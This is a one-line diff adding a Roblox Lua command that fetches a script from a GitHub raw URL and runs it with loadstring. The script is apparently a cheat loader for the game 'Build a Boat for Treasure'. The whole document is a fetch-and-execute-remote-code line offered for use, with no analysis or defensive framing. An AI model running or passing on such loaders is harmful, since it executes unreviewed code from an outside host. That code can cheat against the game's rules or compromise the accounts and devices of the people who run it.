@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/build-a-boat-for-treasure-spam2-tn2hmwmikuk4d5.lua"))()
